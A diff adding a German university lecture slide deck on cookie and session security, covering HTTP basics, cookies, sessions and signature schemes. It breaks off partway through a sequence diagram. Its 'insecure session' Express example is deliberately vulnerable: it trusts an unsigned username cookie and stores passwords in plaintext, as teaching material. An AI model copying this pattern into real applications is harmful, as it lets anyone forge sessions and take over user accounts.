@@ -1,0 +1,2123 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<script src="21_Cookie_und_Session_Security_files/libs/clipboard/clipboard.min.js"></script>
+<script src="21_Cookie_und_Session_Security_files/libs/quarto-html/tabby.min.js"></script>
+<script src="21_Cookie_und_Session_Security_files/libs/quarto-html/popper.min.js"></script>
+<script src="21_Cookie_und_Session_Security_files/libs/quarto-html/tippy.umd.min.js"></script>
+<link href="21_Cookie_und_Session_Security_files/libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="21_Cookie_und_Session_Security_files/libs/quarto-html/light-border.css" rel="stylesheet">
+<link href="21_Cookie_und_Session_Security_files/libs/quarto-html/quarto-syntax-highlighting-da78e890a27eeff987ae7706034fb934.css" rel="stylesheet" id="quarto-text-highlighting-styles"><meta charset="utf-8">
+  <meta name="generator" content="quarto-1.9.37">
+
+  <title>Cookie und Session-Sicherheit</title>
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+  <link rel="stylesheet" href="21_Cookie_und_Session_Security_files/libs/revealjs/dist/reset.css">
+  <link rel="stylesheet" href="21_Cookie_und_Session_Security_files/libs/revealjs/dist/reveal.css">
+  <style>
+    /* Default styles provided by pandoc.
+    ** See https://pandoc.org/MANUAL.html#variables-for-html for config info.
+    */
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+      vertical-align: middle;
+    }
+    /* CSS for syntax highlighting */
+    html { -webkit-text-size-adjust: 100%; }
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      { color: #003b4f; background-color: #f1f3f5; }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span { color: #003b4f; } /* Normal */
+    code span.al { color: #ad0000; } /* Alert */
+    code span.an { color: #5e5e5e; } /* Annotation */
+    code span.at { color: #657422; } /* Attribute */
+    code span.bn { color: #ad0000; } /* BaseN */
+    code span.bu { } /* BuiltIn */
+    code span.cf { color: #003b4f; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #20794d; } /* Char */
+    code span.cn { color: #8f5902; } /* Constant */
+    code span.co { color: #5e5e5e; } /* Comment */
+    code span.cv { color: #5e5e5e; font-style: italic; } /* CommentVar */
+    code span.do { color: #5e5e5e; font-style: italic; } /* Documentation */
+    code span.dt { color: #ad0000; } /* DataType */
+    code span.dv { color: #ad0000; } /* DecVal */
+    code span.er { color: #ad0000; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #ad0000; } /* Float */
+    code span.fu { color: #4758ab; } /* Function */
+    code span.im { color: #00769e; } /* Import */
+    code span.in { color: #5e5e5e; } /* Information */
+    code span.kw { color: #003b4f; font-weight: bold; } /* Keyword */
+    code span.op { color: #5e5e5e; } /* Operator */
+    code span.ot { color: #003b4f; } /* Other */
+    code span.pp { color: #ad0000; } /* Preprocessor */
+    code span.sc { color: #5e5e5e; } /* SpecialChar */
+    code span.ss { color: #20794d; } /* SpecialString */
+    code span.st { color: #20794d; } /* String */
+    code span.va { color: #111111; } /* Variable */
+    code span.vs { color: #20794d; } /* VerbatimString */
+    code span.wa { color: #5e5e5e; font-style: italic; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="21_Cookie_und_Session_Security_files/libs/revealjs/dist/theme/quarto-2740581606dc327e82f18f789b69d8a0.css">
+  <link rel="stylesheet" href="../../styles/theme.css">
+  <link href="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/quarto-line-highlight/line-highlight.css" rel="stylesheet">
+  <link href="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/reveal-menu/menu.css" rel="stylesheet">
+  <link href="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/reveal-menu/quarto-menu.css" rel="stylesheet">
+  <link href="21_Cookie_und_Session_Security_files/libs/revealjs/plugin/quarto-support/footer.css" rel="stylesheet">
+  <style type="text/css">
+    .reveal div.sourceCode {
+      margin: 0;
+      overflow: auto;
+    }
+    .reveal div.hanging-indent {
+      margin-left: 1em;
+      text-indent: -1em;
+    }
+    .reveal .slide:not(.center) {
+      height: 100%;
+    }
+    .reveal .slide.scrollable {
+      overflow-y: auto;
+    }
+    .reveal .footnotes {
+      height: 100%;
+      overflow-y: auto;
+    }
+    .reveal .slide .absolute {
+      position: absolute;
+      display: block;
+    }
+    .reveal .footnotes ol {
+      counter-reset: ol;
+      list-style-type: none; 
+      margin-left: 0;
+    }
+    .reveal .footnotes ol li:before {
+      counter-increment: ol;
+      content: counter(ol) ". "; 
+    }
+    .reveal .footnotes ol li > p:first-child {
+      display: inline-block;
+    }
+    .reveal .slide ul,
+    .reveal .slide ol {
+      margin-bottom: 0.5em;
+    }
+    .reveal .slide ul li,
+    .reveal .slide ol li {
+      margin-top: 0.4em;
+      margin-bottom: 0.2em;
+    }
+    .reveal .slide ul[role="tablist"] li {
+      margin-bottom: 0;
+    }
+    .reveal .slide ul li > *:first-child,
+    .reveal .slide ol li > *:first-child {
+      margin-block-start: 0;
+    }
+    .reveal .slide ul li > *:last-child,
+    .reveal .slide ol li > *:last-child {
+      margin-block-end: 0;
+    }
+    .reveal .slide .columns:nth-child(3) {
+      margin-block-start: 0.8em;
+    }
+    .reveal blockquote {
+      box-shadow: none;
+    }
+    .reveal .tippy-content>* {
+      margin-top: 0.2em;
+      margin-bottom: 0.7em;
+    }
+    .reveal .tippy-content>*:last-child {
+      margin-bottom: 0.2em;
+    }
+    .reveal .slide > img.stretch.quarto-figure-center,
+    .reveal .slide > img.r-stretch.quarto-figure-center {
+      display: block;
+      margin-left: auto;
+      margin-right: auto; 
+    }
+    .reveal .slide > img.stretch.quarto-figure-left,
+    .reveal .slide > img.r-stretch.quarto-figure-left  {
+      display: block;
+      margin-left: 0;
+      margin-right: auto; 
+    }
+    .reveal .slide > img.stretch.quarto-figure-right,
+    .reveal .slide > img.r-stretch.quarto-figure-right  {
+      display: block;
+      margin-left: auto;
+      margin-right: 0; 
+    }
+  </style>
+  <script src="21_Cookie_und_Session_Security_files/libs/quarto-diagram/mermaid.min.js"></script>
+  <script src="21_Cookie_und_Session_Security_files/libs/quarto-diagram/mermaid-init.js"></script>
+  <link href="21_Cookie_und_Session_Security_files/libs/quarto-diagram/mermaid.css" rel="stylesheet">
+</head>
+<body class="quarto-light">
+  <div class="reveal">
+    <div class="slides">
+
+
+<section id="cookie-und-session-sicherheit" class="slide level2 title-slide center" data-state="hide-footer">
+<h2>Cookie und Session-Sicherheit</h2>
+<p><img class="title-image" src="../../images/datenschutz.jpg" alt="" style="--title-image-width: 120vw; --title-image-right: -500px; --title-image-top: 0px; --title-image-height: 100vh; --title-image-object-position: right right;"></p>
+<p>Prof.&nbsp;Dr.&nbsp;Lukas Iffländer<br>
+HTW Dresden<br>
+31.07.2026</p>
+</section>
+<section id="agenda" class="slide level2 content-slide agenda-slide">
+<h2>Agenda</h2>
+<p><br></p>
+<ul class="agenda">
+<li class="agenda-item">
+<strong>01</strong><span>HTTP-Grundlagen</span>
+</li>
+<li class="agenda-item">
+<strong>02</strong><span>Cookies and Sessions</span>
+</li>
+<li class="agenda-item">
+<strong>03</strong><span>Same-Origin-Policy (SOP)</span>
+</li>
+<li class="agenda-item">
+<strong>04</strong><span>Session Attacks</span>
+</li>
+<li class="agenda-item">
+<strong>05</strong><span>Cross-Site Request Forgery (CSRF)</span>
+</li>
+<li class="agenda-item">
+<strong>06</strong><span>Cookie Security</span>
+</li>
+<li class="agenda-item">
+<strong>07</strong><span>Literatur</span>
+</li>
+</ul>
+</section>
+<section id="lernziele" class="slide level2 content-slide pdf-slide">
+<h2>Lernziele</h2>
+<p><br></p>
+<h4 id="nach-dieser-vorlesung-können-sie">Nach dieser Vorlesung können Sie:</h4>
+<ol type="1">
+<li>HTTP-Requests und -Responses lesen und verstehen<br>
+</li>
+<li>Erklären, wie Cookies funktionieren und welche Attribute sicherheitsrelevant sind<br>
+</li>
+<li>Die Same-Origin-Policy definieren und von Cookie-Scoping unterscheiden<br>
+</li>
+<li>Session Hijacking und dessen Gegenmaßnahmen beschreiben<br>
+</li>
+<li>CSRF-Angriffe erklären und Verteidigungsstrategien benennen</li>
+</ol>
+</section>
+<section id="warum-http-verstehen" class="slide level2 content-slide pdf-slide">
+<h2>Warum HTTP verstehen?</h2>
+<p><br></p>
+<ul>
+<li>Web-Sicherheit basiert auf dem Verständnis von HTTP</li>
+<li>Cookies, Sessions und Angriffe nutzen HTTP-Mechanismen</li>
+<li>Browser und Server kommunizieren über HTTP-Nachrichten</li>
+</ul>
+<div title="HTTP = HyperText Transfer Protocol">
+<div class="callout callout-tip callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>HTTP = HyperText Transfer Protocol</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>Zustandsloses Request-Response-Protokoll</li>
+<li>Client (Browser) sendet Request → Server antwortet mit Response</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="http-request-struktur" class="slide level2 content-slide code-slide">
+<h2>HTTP-Request-Struktur</h2>
+<p><br></p>
+<h4 id="aufbau-eines-http-requests">Aufbau eines HTTP-Requests</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1" data-code-line-numbers="|1|2-5|7"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb1-1"><a href=""></a>POST /login HTTP/1.1</span>
+<span id="cb1-2"><a href=""></a>Host: example.com</span>
+<span id="cb1-3"><a href=""></a>Content-Type: application/x-www-form-urlencoded</span>
+<span id="cb1-4"><a href=""></a>Cookie: session=abc123</span>
+<span id="cb1-5"><a href=""></a>User-Agent: Mozilla/5.0</span>
+<span id="cb1-6"><a href=""></a></span>
+<span id="cb1-7"><a href=""></a>username=alice<span class="er">&amp;</span>password=geheim</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><br></p>
+<ul>
+<li>Zeile 1: Methode, Pfad, HTTP-Version</li>
+<li>Zeile 2–5: Header (Key-Value-Paare)</li>
+<li>Nach Leerzeile: Body (optional, bei POST/PUT)</li>
+</ul>
+</section>
+<section id="http-response-struktur" class="slide level2 content-slide code-slide">
+<h2>HTTP-Response-Struktur</h2>
+<p><br></p>
+<h4 id="aufbau-einer-http-response">Aufbau einer HTTP-Response</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2" data-code-line-numbers="|1|2-4|6"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb2-1"><a href=""></a>HTTP/1.1 200 OK</span>
+<span id="cb2-2"><a href=""></a>Content-Type: text/html; charset=utf-8</span>
+<span id="cb2-3"><a href=""></a>Set-Cookie: session=xyz789; Secure; HttpOnly</span>
+<span id="cb2-4"><a href=""></a>Date: Tue, 24 Sep 2024 10:30:00 GMT</span>
+<span id="cb2-5"><a href=""></a></span>
+<span id="cb2-6"><a href=""></a><span class="dt">&lt;!DOCTYPE</span> html<span class="dt">&gt;&lt;</span><span class="kw">html</span><span class="dt">&gt;</span>...<span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><br></p>
+<ul>
+<li>Zeile 1: HTTP-Version, Statuscode, Statustext</li>
+<li>Zeile 2–4: Response-Header</li>
+<li>Nach Leerzeile: Body (HTML, JSON, etc.)</li>
+</ul>
+</section>
+<section id="http-methoden" class="slide level2 content-slide pdf-slide">
+<h2>HTTP-Methoden</h2>
+<p><br></p>
+<table class="caption-top">
+<thead>
+<tr class="header">
+<th>Methode</th>
+<th>Verwendung</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>GET</td>
+<td>Daten abrufen (keine Seiteneffekte)</td>
+</tr>
+<tr class="even">
+<td>POST</td>
+<td>Daten senden/erstellen (Login, Formulare)</td>
+</tr>
+<tr class="odd">
+<td>PUT</td>
+<td>Ressource ersetzen/aktualisieren</td>
+</tr>
+<tr class="even">
+<td>DELETE</td>
+<td>Ressource löschen</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<div title="Sicherheitsrelevant">
+<div class="callout callout-important callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Sicherheitsrelevant</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>GET-Requests: Parameter in URL sichtbar (Logs, History)</li>
+<li>POST-Requests: Parameter im Body (nicht in URL)</li>
+<li>CSRF-Angriffe nutzen diese Unterschiede aus (später mehr)</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="http-vs.-https" class="slide level2 content-slide pdf-slide">
+<h2>HTTP vs.&nbsp;HTTPS</h2>
+<p><br></p>
+<div class="columns">
+<div class="column" style="width:50%;">
+<div title="HTTP (Port 80)">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>HTTP (Port 80)</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>Klartext-Übertragung</li>
+<li>Abhörbar (Man-in-the-Middle)</li>
+<li>Manipulierbar</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div><div class="column" style="width:50%;">
+<div title="HTTPS (Port 443)">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>HTTPS (Port 443)</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>TLS-verschlüsselt</li>
+<li>Vertraulichkeit</li>
+<li>Integrität</li>
+<li>Server-Authentizität</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div></div>
+<div title="Für Web-Security">
+<div class="callout callout-tip callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Für Web-Security</strong></p>
+</div>
+<div class="callout-content">
+<ul>
+<li>Secure-Flag bei Cookies erzwingt HTTPS</li>
+<li>Ohne HTTPS: Session Hijacking trivial möglich (Firesheep)</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</section>
+<section id="was-sind-cookies" class="slide level2 content-slide image-slide">
+<h2>Was sind Cookies?</h2>
+<p><br></p>
+<p><img src="../../images/cookie_monster.jpg" style="height: 600px; width: 800px"></p>
+</section>
+<section id="was-sind-cookies-1" class="slide level2 content-slide pdf-slide">
+<h2>Was sind Cookies?</h2>
+<p><br></p>
+<ul>
+<li>Kleine Textdateien, die auf dem Rechner des Benutzers gespeichert werden</li>
+<li>Werden vom Webserver an den Browser gesendet</li>
+<li>Werden vom Browser gespeichert und bei jedem weiteren Besuch der Seite an den Server gesendet</li>
+<li>Können Informationen über den Benutzer enthalten</li>
+</ul>
+</section>
+<section id="was-sind-cookies-2" class="slide level2 content-slide code-slide">
+<h2>Was sind Cookies?</h2>
+<p><br></p>
+<h4 id="server-antwort-auf-anfrage">Server-Antwort auf Anfrage</h4>
+<p><span class="annotated"> <span class="part"><span class="c-header">Set-Cookie:</span><span class="label c-header">HeaderName</span></span> <span class="part"><span class="c-name">theme</span><span class="label c-name">CookieName</span></span> <span class="part"><span class="c-plain">=</span></span> <span class="part"><span class="c-value">dark</span><span class="label c-value">CookieWert</span></span> <span class="part"><span class="c-plain">;</span></span> </span></p>
+<p><br></p>
+<h4 id="folgende-client-anfrage-enthalten">Folgende Client-Anfrage enthalten</h4>
+<p><span class="annotated"> <span class="part"><span class="c-header">Cookie:</span><span class="label c-header">HeaderName</span></span> <span class="part"><span class="c-name">theme</span><span class="label c-name">CookieName</span></span> <span class="part"><span class="c-plain">=</span></span> <span class="part"><span class="c-value">dark</span><span class="label c-value">CookieWert</span></span> <span class="part"><span class="c-plain">;</span></span> </span></p>
+</section>
+<section id="sessions" class="slide level2 content-slide pdf-slide">
+<h2>Sessions</h2>
+<p><br></p>
+<ul>
+<li>Cookies können verwendet werden, um Sessions zu realisieren</li>
+<li>Ziel: Server behält Daten, die sich auf die gegenwärtige Sitzung des Nutzers beziehen</li>
+<li>Beispiele:
+<ul>
+<li>Warenkorb in einem Online-Shop</li>
+<li>Anmeldung an einer Webseite</li>
+<li>User Tracking</li>
+</ul></li>
+</ul>
+</section>
+<section id="beispiel-unsichere-session-i" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Unsichere Session I</h2>
+<h3 id="html">HTML</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb3"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb3-1"><a href=""></a> 1     <span class="dt">&lt;!doctype</span> html<span class="dt">&gt;</span></span>
+<span id="cb3-2"><a href=""></a> 2     <span class="dt">&lt;</span><span class="kw">html</span><span class="ot"> lang</span><span class="op">=</span><span class="st">'en'</span><span class="dt">&gt;</span></span>
+<span id="cb3-3"><a href=""></a> 3     <span class="dt">&lt;</span><span class="kw">head</span><span class="dt">&gt;</span></span>
+<span id="cb3-4"><a href=""></a> 4         <span class="dt">&lt;</span><span class="kw">meta</span><span class="ot"> charset</span><span class="op">=</span><span class="st">'utf-8'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb3-5"><a href=""></a> 5         <span class="dt">&lt;</span><span class="kw">title</span><span class="dt">&gt;</span>My Cool Site<span class="dt">&lt;/</span><span class="kw">title</span><span class="dt">&gt;</span></span>
+<span id="cb3-6"><a href=""></a> 6     <span class="dt">&lt;/</span><span class="kw">head</span><span class="dt">&gt;</span></span>
+<span id="cb3-7"><a href=""></a> 7     <span class="dt">&lt;</span><span class="kw">body</span><span class="dt">&gt;</span></span>
+<span id="cb3-8"><a href=""></a> 8         <span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Bank login:<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb3-9"><a href=""></a> 9         <span class="dt">&lt;</span><span class="kw">form</span><span class="ot"> method</span><span class="op">=</span><span class="st">'POST'</span><span class="ot"> action</span><span class="op">=</span><span class="st">'/login'</span><span class="dt">&gt;</span></span>
+<span id="cb3-10"><a href=""></a>10             Username:</span>
+<span id="cb3-11"><a href=""></a>11             <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> name</span><span class="op">=</span><span class="st">'username'</span><span class="ot"> </span><span class="dt">/&gt;&lt;</span><span class="kw">br</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb3-12"><a href=""></a>12             Password:</span>
+<span id="cb3-13"><a href=""></a>13             <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> name</span><span class="op">=</span><span class="st">'password'</span><span class="ot"> type</span><span class="op">=</span><span class="st">'password'</span><span class="ot"> </span><span class="dt">/&gt;&lt;</span><span class="kw">br</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb3-14"><a href=""></a>14             <span class="dt">&lt;</span><span class="kw">input</span><span class="ot"> type</span><span class="op">=</span><span class="st">'submit'</span><span class="ot"> value</span><span class="op">=</span><span class="st">'Login'</span><span class="ot"> </span><span class="dt">/&gt;</span></span>
+<span id="cb3-15"><a href=""></a>15         <span class="dt">&lt;/</span><span class="kw">form</span><span class="dt">&gt;</span></span>
+<span id="cb3-16"><a href=""></a>16     <span class="dt">&lt;/</span><span class="kw">body</span><span class="dt">&gt;</span></span>
+<span id="cb3-17"><a href=""></a>17     <span class="dt">&lt;/</span><span class="kw">html</span><span class="dt">&gt;</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-unsichere-session-i-1" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Unsichere Session I</h2>
+<h3 id="javascript-i">JavaScript I</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb4"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb4-1"><a href=""></a> 1     const express = require('express')</span>
+<span id="cb4-2"><a href=""></a> 2     const { createReadStream } = require('fs')</span>
+<span id="cb4-3"><a href=""></a> 3     const cookieParser = require('cookie-parser')</span>
+<span id="cb4-4"><a href=""></a> 4     const app = express()</span>
+<span id="cb4-5"><a href=""></a> 5</span>
+<span id="cb4-6"><a href=""></a> 6     app.use(cookieParser())</span>
+<span id="cb4-7"><a href=""></a> 7     app.use(express.urlencoded({ extended: false }))</span>
+<span id="cb4-8"><a href=""></a> 8</span>
+<span id="cb4-9"><a href=""></a> 9     // Routes go here!</span>
+<span id="cb4-10"><a href=""></a>10</span>
+<span id="cb4-11"><a href=""></a>11     app.listen(8000)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-unsichere-session-i-2" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Unsichere Session I</h2>
+<h3 id="javascript-ii">JavaScript II</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb5-1"><a href=""></a>13     const USERS = { alice: 'password', bob: '50505' }</span>
+<span id="cb5-2"><a href=""></a>14     const BALANCES = { alice: 500, bob: 100 }</span>
+<span id="cb5-3"><a href=""></a>15</span>
+<span id="cb5-4"><a href=""></a>16     app.get('/', (req, res) =&gt; {</span>
+<span id="cb5-5"><a href=""></a>17         const { username } = req.cookies</span>
+<span id="cb5-6"><a href=""></a>18         if (username) {</span>
+<span id="cb5-7"><a href=""></a>19             res.send(`</span>
+<span id="cb5-8"><a href=""></a>20                 <span class="dt">&lt;</span><span class="kw">h1</span><span class="dt">&gt;</span>Welcome, ${username}<span class="dt">&lt;/</span><span class="kw">h1</span><span class="dt">&gt;</span></span>
+<span id="cb5-9"><a href=""></a>21                 <span class="dt">&lt;</span><span class="kw">p</span><span class="dt">&gt;</span>Your balance is $${BALANCES[username]}<span class="dt">&lt;/</span><span class="kw">p</span><span class="dt">&gt;</span></span>
+<span id="cb5-10"><a href=""></a>22             `)</span>
+<span id="cb5-11"><a href=""></a>23         } else {</span>
+<span id="cb5-12"><a href=""></a>24             createReadStream('index.html').pipe(res)</span>
+<span id="cb5-13"><a href=""></a>25         }</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-unsichere-session-i-3" class="slide level2 content-slide code-slide">
+<h2>Beispiel: Unsichere Session I</h2>
+<h3 id="javascript-iii">JavaScript III</h3>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb6"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb6-1"><a href=""></a>28     app.post('/login', (req, res) =&gt; {</span>
+<span id="cb6-2"><a href=""></a>29         const { username } = req.body</span>
+<span id="cb6-3"><a href=""></a>30         const { password } = req.body</span>
+<span id="cb6-4"><a href=""></a>31         if (password === USERS[username]) {</span>
+<span id="cb6-5"><a href=""></a>32             res.cookie('username', username)</span>
+<span id="cb6-6"><a href=""></a>33             res.redirect('/')</span>
+<span id="cb6-7"><a href=""></a>34         } else {</span>
+<span id="cb6-8"><a href=""></a>35             res.send('fail!')</span>
+<span id="cb6-9"><a href=""></a>36         }</span>
+<span id="cb6-10"><a href=""></a>37     })</span>
+<span id="cb6-11"><a href=""></a>38</span>
+<span id="cb6-12"><a href=""></a>39     app.get('/logout', (req, res) =&gt; {</span>
+<span id="cb6-13"><a href=""></a>40         res.clearCookie('username')</span>
+<span id="cb6-14"><a href=""></a>41         res.redirect('/')</span>
+<span id="cb6-15"><a href=""></a>42     })</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="beispiel-unsichere-session" class="slide level2 content-slide code-slide">
+<h2>Beispiel Unsichere Session</h2>
+<h3 id="http-kommunikation">HTTP Kommunikation</h3>
+<p><br></p>
+<h4 id="erster-http-request">Erster HTTP Request</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb7"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb7-1"><a href=""></a>       POST /login HTTP/1.1</span>
+<span id="cb7-2"><a href=""></a>       Host: example.com</span>
+<span id="cb7-3"><a href=""></a>       username=alice<span class="er">&amp;</span>password=password</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<h4 id="http-response">HTTP Response</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb8-1"><a href=""></a>       HTTP/1.1 200 OK</span>
+<span id="cb8-2"><a href=""></a>       Set-Cookie: username=alice</span>
+<span id="cb8-3"><a href=""></a>       Date: Tue, 24 Sep 2019 20:30:00 GMT ...</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<h4 id="zukünftige-http-requests">Zukünftige HTTP Requests</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb9"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb9-1"><a href=""></a>       GET /page.html HTTP/1.1</span>
+<span id="cb9-2"><a href=""></a>       Host: example.com</span>
+<span id="cb9-3"><a href=""></a>       Cookie: username=alice;</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+</section>
+<section id="ambient-authority" class="slide level2 content-slide pdf-slide">
+<h2>Ambient Authority</h2>
+<p><br></p>
+<ul>
+<li><strong>Zugriffskontrolle:</strong> Bestimmt wer welche Ressourcen einsehen kann und welche Aktionen erlaubt sind</li>
+<li><strong>Ambient Authority:</strong> Zugriffskontrolle basieren auf globalen und persistenten Eigenschaften des Anfragenden
+<ul>
+<li>Alternative: Explizite Autorisierung für jede Anfrage</li>
+</ul></li>
+<li>Vier Arten von Ambient Authority:
+<ul>
+<li>Cookies</li>
+<li>IP-Adressvalidierung</li>
+<li>Eingebaute HTTP-Authentifizierung (sehr selten in der Praxis)</li>
+<li>Client-Zertifikate (sehr selten in der Praxis)</li>
+</ul></li>
+</ul>
+</section>
+<section id="signatur-schemata-für-cookies" class="slide level2 content-slide pdf-slide">
+<h2>Signatur-Schemata für Cookies</h2>
+<p><br></p>
+<h4 id="drei-algorithmen-g-s-v">Drei Algorithmen (G, S, V)</h4>
+<ul>
+<li>G () → k: Generierung eines Schlüssels</li>
+<li>S (k, x) → t: Signieren einer Nachricht x mit Schlüssel k in Form eines Tags t.</li>
+<li>V (k, x, t) → {accept|reject}: Verifizieren eines Tags t für eine Nachricht x mit Schlüssel k.</li>
+</ul>
+<h4 id="korrektheitseigenschaft">Korrektheitseigenschaft</h4>
+<ul>
+<li>V (k, x, S (k, x)) = accept sollte immer gelten</li>
+</ul>
+<h4 id="sicherheitseigenschaft">Sicherheitseigenschaft</h4>
+<ul>
+<li>V (k, x, t) = accept sollte fast nie gelten, wenn x und t durch den Angreifer gewählt wurden</li>
+</ul>
+</section>
+<section id="session-cookie-visualisierung" class="slide level2 content-slide code-slide">
+<h2>Session Cookie Visualisierung</h2>
+<div class="columns">
+<div class="column" style="width:62%;">
+<div class="cell" data-reveal="true" data-layout-align="default">
+<div class="cell-output-display">
+<div>
+<p></p><figure class=""><p></p>
+<div>
+<pre class="mermaid mermaid-js">sequenceDiagram
+    participant C as Client
+    participant S as Server
+
+    C-&gt;&gt;S: POST /login HTTP/1.1&lt;br&gt;username=alice&amp;password=password
+    Note right of S: G() -&gt; k
+    Note right of S: Login info ok? OK!
+    Note right of S: S(k, 'alice') -&gt; t
+    S-&gt;&gt;C: HTTP/1.1 200 OK&lt;br&gt;Set-Cookie: username=alice&lt;br&gt;Set-Cookie: tag=t
+
+    loop Bei jedem weiteren Request
